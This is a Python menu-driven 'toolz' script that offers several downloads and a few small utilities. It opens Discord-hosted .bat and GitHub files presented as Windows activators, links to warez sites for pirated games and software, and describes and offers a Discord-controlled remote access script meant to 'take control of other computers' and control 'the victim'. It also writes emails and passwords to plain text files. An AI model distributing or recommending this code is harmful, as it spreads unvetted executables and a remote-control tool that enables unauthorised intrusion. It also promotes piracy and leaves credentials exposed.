import os
import time
import webbrowser

print("please wait...")
time.sleep(1)
print("-")
time.sleep(1)
print("--")

#try:
#    import pyautogui
#except:
#    os.system("pip install pyautogui")
#   import pyautogui

time.sleep(1)
print("---")
time.sleep(0.5)

os.system('cls')

print("""

████████╗ ██████╗  ██████╗ ██╗     ███████╗
╚══██╔══╝██╔═══██╗██╔═══██╗██║     ╚══███╔╝
   ██║   ██║   ██║██║   ██║██║       ███╔╝
   ██║   ██║   ██║██║   ██║██║      ███╔╝
   ██║   ╚██████╔╝╚██████╔╝███████╗███████╗
   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝

   Created by AwakeN The GOAT.
   Everything you need in one script.
   To see all the commands, Enter the command 'help'
""")

command = ""

while True:
    command = input("command here: ")

    if command == "help":
        print("""
[1] Activates Windows for you
[2] Free stuff for your pc
[3] Simple Calculator
[4] Script (more info will be provided)
[5] Save Info as txt
        """)

    if command == "1":

        print("""
[1] Windows 10
[2] Windows 11
        """)

        win_choice = input("What do you choose? ")

        if win_choice == "1":
            webbrowser.open("https://cdn.discordapp.com/attachments/772573553677434881/929514735953674291/act.bat")
        elif win_choice == "2":
            webbrowser.open("https://github.com/virusfreak7/Windows11-activator-script-/archive/refs/heads/main.zip")

        time.sleep(2)
        
        print("""
Instructions:
open the .bat or .cmd file
        """)
        time.sleep(3)

    if command == "2":
        print("""
[1] Free Games
[2] Free Softwares
[3] Free VSTs and Plugins
        """)
        ass = input("What would you like to choose? ")
        
        if ass == "1":
            webbrowser.open("https://i.itorrents-igruha.org/")

        elif ass == "2":
            webbrowser.open("https://getintopc.com/")
        
        elif ass == "3":
            webbrowser.open("https://www.4download.net/")
        
        else:
            print("you typed something wrong...")
    
    if command == "3":

        print("Operators are: +, -, *, /")
        
        first_num = int(input("First number: "))
        operators = input("Operator: ")
        sec_num = int(input("Second Number: "))

        if operators == "+":
            print("Answer is:", first_num + sec_num)
        elif operators == "-":
            print("Answer is:", first_num - sec_num)
        elif operators == "*":
            print("Answer is:", first_num * sec_num)
        elif operators == "/":
            print("Answer is:", first_num / sec_num)

    if command == "4":
        print("""
Explanation:

The 'Script' was made by acua_11 with python, it's purpose is to
take control of other computers.
you can do fun stuff with it, and it's discord based, which
means that you will be able to control the victim through
discord.

Instructions:

make a new discord server and a bot, then in the script's
source code, change the token to your bot's token.
and whenever the script will be launched the bot will
operate.
        
Notes:

the prefix of the bot is '!'.
to see all the commands type '!help' in the server.
        
that's it.
        """)

        time.sleep(2)

        bot_choice = input("Would you like to download the script? [yes/no] ")

        if bot_choice == "yes":
            webbrowser.open("https://cdn.discordapp.com/attachments/832459071163596821/909210550733537301/script.pyw")

        elif bot_choice == "no":
            pass
    
    if command == "5":

        print("""
What do you want to save?
[1] Notes
[2] Emails and passwords
        """)
        
        lmfaolmao = input("Option: ")

        if lmfaolmao == "1":
            notes = input("Type here: ")
            file_notes = input("Name of the txt file: ")
                
            with open(file_notes + ".txt", "w") as f:
                f.write(notes)

        elif lmfaolmao == "2":
            acc = input("Email: ")
            pass1 = input("Password: ")
            file_name = input("Name of the txt file: ")

            with open(file_name + ".txt", "w") as f:
                f.write("Email: " + acc + "\nPassword: " + pass1)

    if command == "clear" or command == "cls":
        os.system('cls')